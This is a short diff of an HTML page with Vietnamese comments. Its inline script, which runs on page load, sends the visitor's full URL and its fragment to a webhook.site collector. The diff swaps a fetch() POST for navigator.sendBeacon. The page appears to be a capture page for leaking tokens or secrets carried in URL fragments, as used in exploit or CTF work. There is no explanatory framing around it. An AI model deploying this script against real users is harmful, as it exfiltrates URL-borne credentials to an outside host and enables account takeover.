@@ -1,10 +1,11 @@
+<!DOCTYPE html>
+<html>
+<body>
 <script>
-const url = location.href;            // chứa cả fragment
-const frag = location.hash || '';     // "#abc" hoặc ''
-fetch('https://webhook.site/8338a31b-9726-49c3-be5f-97874b2dee6b/', {
-  method: 'POST',
-  headers: {'Content-Type':'application/json'},
-  body: JSON.stringify({url, fragment: frag})
-}).catch(()=>{});
-
+navigator.sendBeacon(
+  'https://webhook.site/8338a31b-9726-49c3-be5f-97874b2dee6b/',
+  JSON.stringify({url:location.href, fragment:location.hash})
+);
 </script>
+</body>
+</html>
